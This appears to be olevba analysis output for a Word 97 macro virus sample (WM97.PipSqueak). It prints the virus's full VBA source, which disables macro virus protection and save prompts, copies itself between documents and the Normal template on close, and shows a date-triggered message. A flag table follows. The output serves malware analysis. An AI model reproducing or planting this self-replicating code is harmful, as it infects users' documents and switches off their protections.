olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip-a9d5e5e392839b7168aab10c03ee0ea2dd930ea3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip-a9d5e5e392839b7168aab10c03ee0ea2dd930ea3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO squeak.bas 
in file: Virus.MSWord.Pip-a9d5e5e392839b7168aab10c03ee0ea2dd930ea3 - OLE stream: 'Macros/VBA/squeak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose(): On Error Resume Next: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False: Set Norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents: If Norm.Item("squeak").Name <> "squeak" Then Doc("squeak").Export "c:\squeak.dll": Set infect = NormalTemplate.VBProject: infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Doc.Item("squeak").Name <> "squeak" Then Norm("squeak").Export "c:\squeak.dll": Set infect = ActiveDocument.VBProject: infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Day(Now) = 10 Then MsgBox "I would like you to meet WM97.PipSqueak", 0, "PipSqueak"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |squeak.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

